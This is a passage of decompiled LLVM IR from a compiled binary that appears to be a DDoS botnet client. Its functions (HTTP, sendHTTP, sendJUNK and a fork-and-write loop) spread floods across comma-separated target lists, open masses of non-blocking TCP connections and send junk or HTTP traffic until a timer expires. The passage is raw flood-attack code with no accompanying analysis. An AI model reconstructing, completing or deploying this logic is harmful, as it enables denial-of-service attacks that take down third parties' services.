  %v4_80510bf = load i32, i32* %v3_80510bf, align 4
  %v1_80510c9 = call i32 @random()
  %v2_80510f7 = srem i32 %v1_80510c9, 3
  %v0_8051121 = load i32, i32* @ebp, align 4
  %v2_8051121 = mul nsw i32 %v2_80510f7, 4
  %v3_8051121 = add i32 %v2_8051121, -40
  %v4_8051121 = add i32 %v3_8051121, %v0_8051121
  %v5_8051121 = inttoptr i32 %v4_8051121 to i32*
  %v6_8051121 = load i32, i32* %v5_8051121, align 4
  %v3_805113f = call i32 @_strlen(i8* %arg2)
  %v3_805115f = call i32 @_strlen(i8* %tmp34)
  %v2_8051166 = add i32 %v3_805113f, %v3_805115f
  %v4_8051179 = inttoptr i32 %v4_80510bf to i8*
  %v3_805117f = call i32 @_strlen(i8* %v4_8051179)
  %v2_8051186 = add i32 %v2_8051166, %v3_805117f
  store i1 false, i1* @df, align 1
  %v4_8051199 = inttoptr i32 %v6_8051121 to i8*
  store i32 %v6_8051121, i32* @edi, align 4
  %v3_805119f = call i32 @_strlen(i8* %v4_8051199)
  %v2_805118663 = add i32 %v2_8051186, %v3_805119f
  %v1_80511a9 = add i32 %v2_805118663, 55
  %v4_80511af = add i32 %v2_805118663, -968
  %v9_80511af = sub i32 967, %v2_805118663
  %v10_80511af = and i32 %v9_80511af, %v1_80511a9
  %v11_80511af = icmp slt i32 %v10_80511af, 0
  %v12_80511af = icmp eq i32 %v4_80511af, 0
  %v13_80511af = icmp slt i32 %v4_80511af, 0
  %v3_80511b6 = icmp eq i1 %v13_80511af, %v11_80511af
  %v4_80511b6 = icmp eq i1 %v12_80511af, false
  %v5_80511b6 = and i1 %v4_80511b6, %v3_80511b6
  br i1 %v5_80511b6, label %dec_label_pc_805129f, label %dec_label_pc_80511bc

dec_label_pc_80511bc:                             ; preds = %entry
  %v4_8051128 = ptrtoint i8* %arg2 to i32
  %v2_80511e7 = ptrtoint i32* %stack_var_-1068 to i32
  %v10_80511f0 = call i32 @__GI_snprintf(i32 %v2_80511e7, i32 %v1_80511a9, i32 ptrtoint ([64 x i8]* @global_var_806b034.247 to i32), i32 %v4_8051128, i32 %arg4, i32 %v4_80510bf, i32 %v6_8051121)
  %v5_805129961 = icmp sgt i32 %arg6, 0
  br i1 %v5_805129961, label %dec_label_pc_8051201, label %dec_label_pc_805129f

dec_label_pc_8051201:                             ; preds = %dec_label_pc_80511bc, %dec_label_pc_8051290
  %storemerge62 = phi i32 [ %v4_8051290, %dec_label_pc_8051290 ], [ 0, %dec_label_pc_80511bc ]
  %v1_8051201 = call i32 @fork(i32 %storemerge62)
  %v1_8051206 = icmp eq i32 %v1_8051201, 0
  br i1 %v1_8051206, label %dec_label_pc_8051290, label %dec_label_pc_8051273.preheader

dec_label_pc_8051273.preheader:                   ; preds = %dec_label_pc_8051201
  %v2_8051220 = trunc i32 %arg3 to i16
  %v4_8051242 = bitcast i32* %stack_var_-1068 to i8*
  br label %dec_label_pc_8051273

dec_label_pc_8051210:                             ; preds = %dec_label_pc_8051273
  store i32 %arg1, i32* @edx, align 4
  %v3_8051220 = call i32 @socket_connect(i32 %arg1, i16 %v2_8051220)
  %v4_8051228 = icmp eq i32 %v3_8051220, 0
  br i1 %v4_8051228, label %dec_label_pc_8051273, label %dec_label_pc_805122e

dec_label_pc_805122e:                             ; preds = %dec_label_pc_8051210
  store i1 false, i1* @df, align 1
  store i32 %v2_80511e7, i32* @edi, align 4
  %v3_8051248 = call i32 @_strlen(i8* %v4_8051242)
  %v4_8051248 = mul i32 %v3_8051248, -1
  %v5_8051248 = add i32 %v4_8051248, -2
  store i32 %v5_8051248, i32* @ecx, align 4
  %v1_805124e = sub i32 0, %v4_8051248
  %v4_8051263 = call i32 @write(i32 %v3_8051220, i32 %v2_80511e7, i32 %v1_805124e)
  %v1_805126e = call i32 @close(i32 %v3_8051220)
  br label %dec_label_pc_8051273

dec_label_pc_8051273:                             ; preds = %dec_label_pc_8051210, %dec_label_pc_805122e, %dec_label_pc_8051273.preheader
  %v2_805127a = call i32 @__GI_time(i32* null)
  %v5_8051282 = icmp slt i32 %v2_805127a, %v5_805106e
  br i1 %v5_8051282, label %dec_label_pc_8051210, label %dec_label_pc_8051284

dec_label_pc_8051284:                             ; preds = %dec_label_pc_8051273
  %v1_805128b = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_8051290:                             ; preds = %dec_label_pc_8051201
  %v4_8051290 = add nuw nsw i32 %storemerge62, 1
  %v5_8051299 = icmp slt i32 %v4_8051290, %arg6
  br i1 %v5_8051299, label %dec_label_pc_8051201, label %dec_label_pc_805129f

dec_label_pc_805129f:                             ; preds = %dec_label_pc_80511bc, %dec_label_pc_8051290, %entry
  %v0_80512a7 = phi i32 [ %v1_80511a9, %entry ], [ 0, %dec_label_pc_80511bc ], [ %v4_8051290, %dec_label_pc_8051290 ]
  ret i32 %v0_80512a7

; uselistorder directives
  uselistorder i32 %v4_8051290, { 0, 2, 1 }
  uselistorder i32 %storemerge62, { 1, 0 }
  uselistorder i32 %v4_80511af, { 1, 0 }
  uselistorder i32 %v6_8051121, { 0, 2, 1 }
  uselistorder i32 %v2_80510b1, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805129f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051273, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051201, { 1, 0 }
}

define i32 @HTTP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %v1_80512b7 = call i32 @mfork(i32 %arg2)
  %v1_80512bc = icmp eq i32 %v1_80512b7, 0
  %v1_80512be = icmp eq i1 %v1_80512bc, false
  br i1 %v1_80512be, label %dec_label_pc_8051481, label %dec_label_pc_80512c4

dec_label_pc_80512c4:                             ; preds = %entry
  %v4_80512c4 = add i32 %arg3, -5
  %v9_80512c4 = sub i32 4, %arg3
  %v10_80512c4 = and i32 %v9_80512c4, %arg3
  %v11_80512c4 = icmp slt i32 %v10_80512c4, 0
  %v12_80512c4 = icmp eq i32 %v4_80512c4, 0
  %v13_80512c4 = icmp slt i32 %v4_80512c4, 0
  %v3_80512c8 = icmp eq i1 %v13_80512c4, %v11_80512c4
  %v4_80512c8 = icmp eq i1 %v12_80512c4, false
  %v5_80512c8 = and i1 %v4_80512c8, %v3_80512c8
  br i1 %v5_80512c8, label %dec_label_pc_80512e4, label %dec_label_pc_80512ca

dec_label_pc_80512ca:                             ; preds = %dec_label_pc_80512c4
  %v2_80512df = call i32 @Send(i32 %arg1, i32 ptrtoint ([64 x i8]* @global_var_806b074.248 to i32))
  br label %dec_label_pc_80512e4

dec_label_pc_80512e4:                             ; preds = %dec_label_pc_80512c4, %dec_label_pc_80512ca
  %v1_80512e7 = add i32 %arg4, 24
  %v1_80512ea = inttoptr i32 %v1_80512e7 to i32*
  %v2_80512ea = load i32, i32* %v1_80512ea, align 4
  %v1_80512ef = call i32 @atol(i32 %v2_80512ea)
  %v1_80512f9 = add i32 %arg4, 8
  %v2_805131b = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_806b0b4.249 to i32))
  %v1_8051323 = add i32 %arg4, 4
  %v1_8051326 = inttoptr i32 %v1_8051323 to i32*
  %v2_8051326 = load i32, i32* %v1_8051326, align 4
  %v2_8051333 = inttoptr i32 %v2_8051326 to i8*
  %v3_8051333 = call i32 @__GI_strchr(i8* %v2_8051333, i32 44)
  %v1_8051338 = icmp eq i32 %v3_8051333, 0
  br i1 %v1_8051338, label %dec_label_pc_8051402, label %dec_label_pc_8051340

dec_label_pc_8051340:                             ; preds = %dec_label_pc_80512e4
  %v2_8051346 = load i32, i32* %v1_8051326, align 4
  store i32 %v2_8051346, i32* @eax, align 4
  %v2_8051353 = call i32 @__GI_strtok(i32 %v2_8051346, i32 ptrtoint (i32* @global_var_806a7de.148 to i32))
  %v4_80513f62 = icmp eq i32 %v2_8051353, 0
  %v1_80513fa9 = icmp eq i1 %v4_80513f62, false
  br i1 %v1_80513fa9, label %dec_label_pc_8051360, label %dec_label_pc_8051481

dec_label_pc_8051360:                             ; preds = %dec_label_pc_8051340, %dec_label_pc_80513df
  %storemerge110 = phi i32 [ %v2_80513ee, %dec_label_pc_80513df ], [ %v2_8051353, %dec_label_pc_8051340 ]
  %v1_8051360 = call i32 @listFork(i32 %storemerge110)
  store i32 %v1_8051360, i32* @eax, align 4
  %v1_8051365 = icmp eq i32 %v1_8051360, 0
  %v1_8051367 = icmp eq i1 %v1_8051365, false
  br i1 %v1_8051367, label %dec_label_pc_80513df, label %dec_label_pc_8051369

dec_label_pc_8051369:                             ; preds = %dec_label_pc_8051360
  %v2_805136f = load i32, i32* %v1_80512ea, align 4
  %v1_8051374 = call i32 @atol(i32 %v2_805136f)
  store i32 %v1_8051374, i32* @ebx, align 4
  %v1_805137e = add i32 %arg4, 20
  %v1_8051381 = inttoptr i32 %v1_805137e to i32*
  %v2_8051381 = load i32, i32* %v1_8051381, align 4
  %v1_8051386 = call i32 @atol(i32 %v2_8051381)
  store i32 %v1_8051386, i32* @esi, align 4
  %v1_8051390 = add i32 %arg4, 16
  %v1_8051393 = inttoptr i32 %v1_8051390 to i32*
  %v2_8051393 = load i32, i32* %v1_8051393, align 4
  store i32 %v2_8051393, i32* @edi, align 4
  %v1_8051398 = add i32 %arg4, 12
  %v1_805139b = inttoptr i32 %v1_8051398 to i32*
  %v2_805139b = load i32, i32* %v1_805139b, align 4
  %v1_80513a0 = call i32 @atol(i32 %v2_805139b)
  %v1_80513ad = inttoptr i32 %v1_80512f9 to i32*
  %v2_80513ad = load i32, i32* %v1_80513ad, align 4
  %v2_80513b5 = load i32, i32* %v1_8051326, align 4
  %v0_80513b7 = load i32, i32* @ebx, align 4
  %v0_80513bb = load i32, i32* @esi, align 4
  %v0_80513bf = load i32, i32* @edi, align 4
  %v6_80513ce = inttoptr i32 %v2_80513ad to i8*
  %v7_80513ce = call i32 @sendHTTP(i32 %v2_80513b5, i8* %v6_80513ce, i32 %v1_80513a0, i32 %v0_80513bf, i32 %v0_80513bb, i32 %v0_80513b7)
  %v1_80513da = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80513df:                             ; preds = %dec_label_pc_8051360
  %v2_80513ee = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_806a7de.148 to i32))
  %v4_80513f6 = icmp eq i32 %v2_80513ee, 0
  %v1_80513fa = icmp eq i1 %v4_80513f6, false
  br i1 %v1_80513fa, label %dec_label_pc_8051360, label %dec_label_pc_8051481

dec_label_pc_8051402:                             ; preds = %dec_label_pc_80512e4
  %v1_8051402 = call i32 @listFork(i32 %tmp13)
  %v1_8051407 = icmp eq i32 %v1_8051402, 0
  %v1_8051409 = icmp eq i1 %v1_8051407, false
  br i1 %v1_8051409, label %dec_label_pc_8051481, label %dec_label_pc_805140b

dec_label_pc_805140b:                             ; preds = %dec_label_pc_8051402
  %v2_8051411 = load i32, i32* %v1_80512ea, align 4
  %v1_8051416 = call i32 @atol(i32 %v2_8051411)
  store i32 %v1_8051416, i32* @ebx, align 4
  %v1_8051420 = add i32 %arg4, 20
  %v1_8051423 = inttoptr i32 %v1_8051420 to i32*
  %v2_8051423 = load i32, i32* %v1_8051423, align 4
  %v1_8051428 = call i32 @atol(i32 %v2_8051423)
  store i32 %v1_8051428, i32* @esi, align 4
  %v1_8051432 = add i32 %arg4, 16
  %v1_8051435 = inttoptr i32 %v1_8051432 to i32*
  %v2_8051435 = load i32, i32* %v1_8051435, align 4
  store i32 %v2_8051435, i32* @edi, align 4
  %v1_805143a = add i32 %arg4, 12
  %v1_805143d = inttoptr i32 %v1_805143a to i32*
  %v2_805143d = load i32, i32* %v1_805143d, align 4
  %v1_8051442 = call i32 @atol(i32 %v2_805143d)
  %v1_805144f = inttoptr i32 %v1_80512f9 to i32*
  %v2_805144f = load i32, i32* %v1_805144f, align 4
  %v2_8051457 = load i32, i32* %v1_8051326, align 4
  %v0_8051459 = load i32, i32* @ebx, align 4
  %v0_805145d = load i32, i32* @esi, align 4
  %v0_8051461 = load i32, i32* @edi, align 4
  %v6_8051470 = inttoptr i32 %v2_805144f to i8*
  %v7_8051470 = call i32 @sendHTTP(i32 %v2_8051457, i8* %v6_8051470, i32 %v1_8051442, i32 %v0_8051461, i32 %v0_805145d, i32 %v0_8051459)
  %v1_805147c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8051481:                             ; preds = %dec_label_pc_80513df, %dec_label_pc_8051340, %dec_label_pc_8051402, %entry
  %v0_8051488 = phi i32 [ %v1_8051402, %dec_label_pc_8051402 ], [ %v1_80512b7, %entry ], [ %v2_8051353, %dec_label_pc_8051340 ], [ %v2_80513ee, %dec_label_pc_80513df ]
  ret i32 %v0_8051488

; uselistorder directives
  uselistorder i32 %v2_80513ee, { 0, 2, 1 }
  uselistorder i32 %v2_8051353, { 1, 0, 2 }
  uselistorder i32* %v1_8051326, { 2, 0, 1, 3 }
  uselistorder i32 %v1_80512f9, { 1, 0 }
  uselistorder i32* %v1_80512ea, { 1, 0, 2 }
  uselistorder i32 %v4_80512c4, { 1, 0 }
  uselistorder i32 (i32)* @listFork, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_806a7de.148 to i32), { 0, 1, 6, 7, 8, 2, 3, 4, 5 }
  uselistorder i32 %arg4, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051481, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8051360, { 1, 0 }
  uselistorder label %dec_label_pc_80512e4, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %v12_805148e = ptrtoint i32* %stack_var_-252 to i32
  store i32 %v12_805148e, i32* %eax.global-to-local, align 4
  %v1_805149c = call i32 @getdtablesize(i32 %v12_805148e)
  store i32 %v1_805149c, i32* @edx, align 4
  %tmp = icmp slt i32 %v1_805149c, 0
  %v2_80514a5 = zext i1 %tmp to i32
  %v2_80514a8 = add i32 %v2_80514a5, %v1_805149c
  %v2_80514aa = sdiv i32 %v2_80514a8, 2
  store i32 2, i32* %stack_var_-64, align 4
  %v1_80514b8 = urem i32 %arg2, 65536
  store i32 %v1_80514b8, i32* %eax.global-to-local, align 4
  store i32 %v1_80514b8, i32* %stack_var_-252, align 4
  %v1_80514be = trunc i32 %arg2 to i16
  %v2_80514be = call i32 @htons(i16 %v1_80514be)
  %v2_80514ca = ptrtoint i32* %stack_var_-64 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-252, align 4
  %v3_80514da = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_80514da, i32* %eax.global-to-local, align 4
  %v1_80514df = icmp eq i32 %v3_80514da, 0
  br i1 %v1_80514df, label %dec_label_pc_80514e8, label %dec_label_pc_805188a

dec_label_pc_80514e8:                             ; preds = %entry
  %v15_80514fb = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v15_80514fb, i32* %eax.global-to-local, align 4
  store i32 %v15_80514fb, i32* %stack_var_-252, align 4
  %v3_8051501 = bitcast i32* %stack_var_-56 to i8*
  %v4_8051501 = call i32 @__GI_memset(i8* %v3_8051501, i32 0, i32 8)
  %v2_8051509 = mul i32 %v2_80514aa, 8
  %v1_805150f = add i32 %v2_8051509, 30
  %v2_8051512 = and i32 %v1_805150f, -16
  %v0_8051518 = load i32, i32* @esp, align 4
  %v2_8051518 = sub i32 %v0_8051518, %v2_8051512
  %v1_805152a = add i32 %v2_8051518, 35
  %v2_805152d = and i32 %v1_805152a, -16
  %v2_805154a = mul i32 %v2_80514aa, 5
  store i32 %v2_805154a, i32* %eax.global-to-local, align 4
  store i32 %v2_805152d, i32* %edx.global-to-local, align 4
  %v2_805154f = add i32 %v2_8051518, 8
  %v3_805154f = inttoptr i32 %v2_805154f to i32*
  store i32 %v2_805154a, i32* %v3_805154f, align 4
  %v0_8051553 = load i32, i32* @esp, align 4
  %v1_8051553 = add i32 %v0_8051553, 4
  %v2_8051553 = inttoptr i32 %v1_8051553 to i32*
  store i32 0, i32* %v2_8051553, align 4
  %v0_805155b = load i32, i32* %edx.global-to-local, align 4
  %v1_805155b = load i32, i32* @esp, align 4
  %v2_805155b = inttoptr i32 %v1_805155b to i32*
  store i32 %v0_805155b, i32* %v2_805155b, align 4
  %v3_805155e = inttoptr i32 %v2_805152d to i8*
  %v4_805155e = call i32 @__GI_memset(i8* %v3_805155e, i32 %tmp5, i32 %v12_805148e)
  store i32 %v4_805155e, i32* %eax.global-to-local, align 4
  %v0_8051563 = load i32, i32* @esp, align 4
  %v1_8051563 = inttoptr i32 %v0_8051563 to i32*
  store i32 1024, i32* %v1_8051563, align 4
  %v1_805156a = call i32 @malloc(i32 %v2_805152d)
  %v0_8051572 = load i32, i32* @esp, align 4
  %v1_8051572 = add i32 %v0_8051572, 8
  %v2_8051572 = inttoptr i32 %v1_8051572 to i32*
  store i32 1024, i32* %v2_8051572, align 4
  %v0_805157a = load i32, i32* @esp, align 4
  %v1_805157a = add i32 %v0_805157a, 4
  %v2_805157a = inttoptr i32 %v1_805157a to i32*
  store i32 0, i32* %v2_805157a, align 4
  store i32 %v1_805156a, i32* %eax.global-to-local, align 4
  %v1_8051585 = load i32, i32* @esp, align 4
  %v2_8051585 = inttoptr i32 %v1_8051585 to i32*
  store i32 %v1_805156a, i32* %v2_8051585, align 4
  %v3_8051588 = inttoptr i32 %v1_805156a to i8*
  %v4_8051588 = call i32 @__GI_memset(i8* %v3_8051588, i32 %tmp9, i32 %tmp7)
  store i32 %v4_8051588, i32* %eax.global-to-local, align 4
  %v0_8051594 = load i32, i32* @esp, align 4
  %v1_8051594 = inttoptr i32 %v0_8051594 to i32*
  store i32 0, i32* %v1_8051594, align 4
  %v2_805159b = call i32 @__GI_time(i32* inttoptr (i32 1024 to i32*))
  %v5_80515a0 = add i32 %v2_805159b, %arg3
  store i32 %v5_80515a0, i32* %eax.global-to-local, align 4
  %v3_80515bd = or i32 %v2_805152d, 4
  %v2_80516c1 = ptrtoint i32* %stack_var_-192 to i32
  %tmp32 = bitcast i32* %stack_var_-192 to i8*
  %v2_8051712 = ptrtoint i32* %stack_var_-200 to i32
  %v2_805175a = ptrtoint i32* %stack_var_-204 to i32
  %v2_8051764 = ptrtoint i32* %stack_var_-208 to i32
  %v16_805186c39 = icmp sgt i32 %v2_80514a8, 1
  br label %dec_label_pc_8051875

dec_label_pc_80515b7:                             ; preds = %dec_label_pc_8051869.preheader, %dec_label_pc_8051866
  %storemerge43 = phi i32 [ %v4_8051866, %dec_label_pc_8051866 ], [ 0, %dec_label_pc_8051869.preheader ]
  %stack_var_-16.142 = phi i32 [ %stack_var_-16.0, %dec_label_pc_8051866 ], [ %stack_var_-16.2, %dec_label_pc_8051869.preheader ]
  %stack_var_-20.141 = phi i32 [ %stack_var_-20.0, %dec_label_pc_8051866 ], [ %stack_var_-20.2, %dec_label_pc_8051869.preheader ]
  store i32 %storemerge43, i32* %eax.global-to-local, align 4
  store i32 %v2_805152d, i32* %edx.global-to-local, align 4
  %v2_80515bd = mul i32 %storemerge43, 8
  %v4_80515bd = add i32 %v2_80515bd, %v3_80515bd
  %v5_80515bd = inttoptr i32 %v4_80515bd to i8*
  %v6_80515bd = load i8, i8* %v5_80515bd, align 4
  %v7_80515bd = zext i8 %v6_80515bd to i32
  store i32 %v7_80515bd, i32* %eax.global-to-local, align 4
  %v8_80515cb = icmp eq i8 %v6_80515bd, 0
  %v12_80515cb = icmp eq i8 %v6_80515bd, 1
  br i1 %v12_80515cb, label %dec_label_pc_80516b7, label %dec_label_pc_80515d8

dec_label_pc_80515d8:                             ; preds = %dec_label_pc_80515b7
  %v12_80515d8 = icmp eq i8 %v6_80515bd, 2
  br i1 %v12_80515d8, label %dec_label_pc_80517e9, label %dec_label_pc_80515e5

dec_label_pc_80515e5:                             ; preds = %dec_label_pc_80515d8
  br i1 %v8_80515cb, label %dec_label_pc_80515f3, label %dec_label_pc_8051866

dec_label_pc_80515f3:                             ; preds = %dec_label_pc_80515e5
  store i32 %storemerge43, i32* @ebx, align 4
  %v0_80515f6 = load i32, i32* @esp, align 4
  %v1_80515f6 = add i32 %v0_80515f6, 8
  %v2_80515f6 = inttoptr i32 %v1_80515f6 to i32*
  store i32 0, i32* %v2_80515f6, align 4
  %v0_80515fe = load i32, i32* @esp, align 4
  %v1_80515fe = add i32 %v0_80515fe, 4
  %v2_80515fe = inttoptr i32 %v1_80515fe to i32*
  store i32 1, i32* %v2_80515fe, align 4
  %v0_8051606 = load i32, i32* @esp, align 4
  %v1_8051606 = inttoptr i32 %v0_8051606 to i32*
  store i32 2, i32* %v1_8051606, align 4
  %v3_805160d = call i32 @socket(i32 %v7_80515bd, i32 %v12_805148e, i32 ptrtoint (i32* @0 to i32))
  %v2_8051617 = load i32, i32* @ebx, align 4
  %v3_8051617 = mul i32 %v2_8051617, 8
  %v4_8051617 = add i32 %v3_8051617, %v2_805152d
  %v5_8051617 = inttoptr i32 %v4_8051617 to i32*
  store i32 %v3_805160d, i32* %v5_8051617, align 8
  store i32 %storemerge43, i32* %edx.global-to-local, align 4
  store i32 %v2_805152d, i32* %eax.global-to-local, align 4
  %v3_8051620 = add i32 %v2_80515bd, %v2_805152d
  %v4_8051620 = inttoptr i32 %v3_8051620 to i32*
  %v5_8051620 = load i32, i32* %v4_8051620, align 8
  store i32 %v5_8051620, i32* %eax.global-to-local, align 4
  %v0_8051623 = load i32, i32* @esp, align 4
  %v1_8051623 = add i32 %v0_8051623, 8
  %v2_8051623 = inttoptr i32 %v1_8051623 to i32*
  store i32 0, i32* %v2_8051623, align 4
  %v0_805162b = load i32, i32* @esp, align 4
  %v1_805162b = add i32 %v0_805162b, 4
  %v2_805162b = inttoptr i32 %v1_805162b to i32*
  store i32 3, i32* %v2_805162b, align 4
  %v0_8051633 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051633 = load i32, i32* @esp, align 4
  %v2_8051633 = inttoptr i32 %v1_8051633 to i32*
  store i32 %v0_8051633, i32* %v2_8051633, align 4
  %v3_8051636 = call i32 @fcntl(i32 %v7_80515bd, i32 %v12_805148e, i32 ptrtoint (i32* @0 to i32))
  %v1_805163d = or i32 %v3_8051636, 2048
  store i32 %v1_805163d, i32* @ecx, align 4
  store i32 %storemerge43, i32* %edx.global-to-local, align 4
  store i32 %v2_805152d, i32* %eax.global-to-local, align 4
  %v5_8051649 = load i32, i32* %v4_8051620, align 8
  store i32 %v5_8051649, i32* %eax.global-to-local, align 4
  %v1_805164c = load i32, i32* @esp, align 4
  %v2_805164c = add i32 %v1_805164c, 8
  %v3_805164c = inttoptr i32 %v2_805164c to i32*
  store i32 %v1_805163d, i32* %v3_805164c, align 4
  %v0_8051650 = load i32, i32* @esp, align 4
  %v1_8051650 = add i32 %v0_8051650, 4
  %v2_8051650 = inttoptr i32 %v1_8051650 to i32*
  store i32 4, i32* %v2_8051650, align 4
  %v0_8051658 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051658 = load i32, i32* @esp, align 4
  %v2_8051658 = inttoptr i32 %v1_8051658 to i32*
  store i32 %v0_8051658, i32* %v2_8051658, align 4
  %v3_805165b = call i32 @fcntl(i32 %v7_80515bd, i32 %v12_805148e, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_80514ca, i32* @ecx, align 4
  store i32 %storemerge43, i32* %edx.global-to-local, align 4
  store i32 %v2_805152d, i32* %eax.global-to-local, align 4
  %v5_8051669 = load i32, i32* %v4_8051620, align 8
  store i32 %v5_8051669, i32* %eax.global-to-local, align 4
  %v0_805166c = load i32, i32* @esp, align 4
  %v1_805166c = add i32 %v0_805166c, 8
  %v2_805166c = inttoptr i32 %v1_805166c to i32*
  store i32 16, i32* %v2_805166c, align 4
  %v1_8051674 = load i32, i32* @esp, align 4
  %v2_8051674 = add i32 %v1_8051674, 4
  %v3_8051674 = inttoptr i32 %v2_8051674 to i32*
  store i32 %v2_80514ca, i32* %v3_8051674, align 4
  %v0_8051678 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051678 = load i32, i32* @esp, align 4
  %v2_8051678 = inttoptr i32 %v1_8051678 to i32*
  store i32 %v0_8051678, i32* %v2_8051678, align 4
  %v3_805167b = call i32 @connect(i32 %v7_80515bd, i32 %v12_805148e, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805167b, i32* %eax.global-to-local, align 4
  %v10_8051680 = icmp eq i32 %v3_805167b, -1
  %v1_8051683 = icmp eq i1 %v10_8051680, false
  br i1 %v1_8051683, label %dec_label_pc_8051691, label %dec_label_pc_8051685

dec_label_pc_8051685:                             ; preds = %dec_label_pc_80515f3
  %v1_8051685 = call i32 @__errno_location(i32 %v7_80515bd)
  store i32 %v1_8051685, i32* %eax.global-to-local, align 4
  %v1_805168a = inttoptr i32 %v1_8051685 to i32*
  %v2_805168a = load i32, i32* %v1_805168a, align 4
  store i32 %v2_805168a, i32* %eax.global-to-local, align 4
  %v9_805168c = icmp eq i32 %v2_805168a, 115
  br i1 %v9_805168c, label %dec_label_pc_80516a7, label %dec_label_pc_8051691

dec_label_pc_8051691:                             ; preds = %dec_label_pc_8051685, %dec_label_pc_80515f3
  store i32 %storemerge43, i32* %eax.global-to-local, align 4
  store i32 %v2_805152d, i32* %edx.global-to-local, align 4
  %v5_8051697 = load i32, i32* %v4_8051620, align 8
  store i32 %v5_8051697, i32* %eax.global-to-local, align 4
  %v1_805169a = load i32, i32* @esp, align 4
  %v2_805169a = inttoptr i32 %v1_805169a to i32*
  store i32 %v5_8051697, i32* %v2_805169a, align 4
  %v1_805169d = call i32 @close(i32 %v7_80515bd)
  store i32 %v1_805169d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051866

dec_label_pc_80516a7:                             ; preds = %dec_label_pc_8051685
  store i32 %storemerge43, i32* %edx.global-to-local, align 4
  store i32 %v2_805152d, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v5_80515bd, align 4
  br label %dec_label_pc_8051866

dec_label_pc_80516b7:                             ; preds = %dec_label_pc_80515b7
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_80516c1, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80516c8 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v6_80516c8 = ptrtoint i8* %v5_80516c8 to i32
  store i32 %storemerge43, i32* %edx.global-to-local, align 4
  store i32 %v2_805152d, i32* %eax.global-to-local, align 4
  %v3_80516d6 = add i32 %v2_80515bd, %v2_805152d
  %v4_80516d6 = inttoptr i32 %v3_80516d6 to i32*
  %v5_80516d6 = load i32, i32* %v4_80516d6, align 8
  %v2_80516db = udiv i32 %v5_80516d6, 32
  store i32 %storemerge43, i32* %edx.global-to-local, align 4
  store i32 %v2_805152d, i32* %eax.global-to-local, align 4
  %v5_80516e4 = load i32, i32* %v4_80516d6, align 8
  %v1_80516e7 = urem i32 %v5_80516e4, 32
  store i32 %v1_80516e7, i32* %eax.global-to-local, align 4
  %v0_80516ea = load i32, i32* @ebp, align 4
  %v2_80516ea = mul nuw nsw i32 %v2_80516db, 4
  %v3_80516ea = add nsw i32 %v2_80516ea, -188
  %v4_80516ea = add i32 %v3_80516ea, %v0_80516ea
  %v5_80516ea = inttoptr i32 %v4_80516ea to i32*
  %v6_80516ea = load i32, i32* %v5_80516ea, align 4
  %v9_80516ea = shl i32 1, %v1_80516e7
  %v12_80516ea = or i32 %v6_80516ea, %v9_80516ea
  store i32 %v12_80516ea, i32* %v5_80516ea, align 4
  store i32 0, i32* %stack_var_-200, align 4
  store i32 %storemerge43, i32* %edx.global-to-local, align 4
  store i32 %v2_805152d, i32* %eax.global-to-local, align 4
  %v5_805170c = load i32, i32* %v4_80516d6, align 8
  %v1_805170f = add i32 %v5_805170c, 1
  store i32 %v1_805170f, i32* %edx.global-to-local, align 4
  %v1_8051718 = load i32, i32* @esp, align 4
  %v2_8051718 = add i32 %v1_8051718, 16
  %v3_8051718 = inttoptr i32 %v2_8051718 to i32*
  store i32 %v2_8051712, i32* %v3_8051718, align 4
  %v0_805171c = load i32, i32* @esp, align 4
  %v1_805171c = add i32 %v0_805171c, 12
  %v2_805171c = inttoptr i32 %v1_805171c to i32*
  store i32 0, i32* %v2_805171c, align 4
  store i32 %v2_80516c1, i32* %eax.global-to-local, align 4
  %v1_805172a = load i32, i32* @esp, align 4
  %v2_805172a = add i32 %v1_805172a, 8
  %v3_805172a = inttoptr i32 %v2_805172a to i32*
  store i32 %v2_80516c1, i32* %v3_805172a, align 4
  %v0_805172e = load i32, i32* @esp, align 4
  %v1_805172e = add i32 %v0_805172e, 4
  %v2_805172e = inttoptr i32 %v1_805172e to i32*
